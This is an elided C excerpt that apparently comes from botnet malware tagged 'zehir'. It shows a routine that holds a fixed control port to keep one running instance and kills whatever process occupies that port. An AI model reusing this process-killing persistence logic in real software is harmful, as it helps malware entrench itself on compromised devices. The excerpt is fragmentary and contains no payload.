...
#define SINGLE_INSTANCE_PORT 39182
...
static void ensure_single_instance(void)
{
    ...
    if (bind(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
    {
        if (errno == EADDRNOTAVAIL && local_bind)
            local_bind = FALSE;
#ifdef DEBUG
        printf("(zehir/main) another instance is already running (errno = %d)! sending kill request ..\r\n", errno);
#endif
        ...
        {
#ifdef DEBUG
            printf("(zehir/main) failed to connect to fd_ctrl to request process termination\n");
#endif
        }
    ...
    else
    {
        ...
        {
#ifdef DEBUG
            printf("(zehir/main) failed to call listen() on fd_ctrl\n");
            close(fd_ctrl);
            sleep(5);
            killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
            ensure_single_instance();
...
#ifdef DEBUG
        printf("(zehir/main) we are the only process on this system!\n");
#endif
    }
}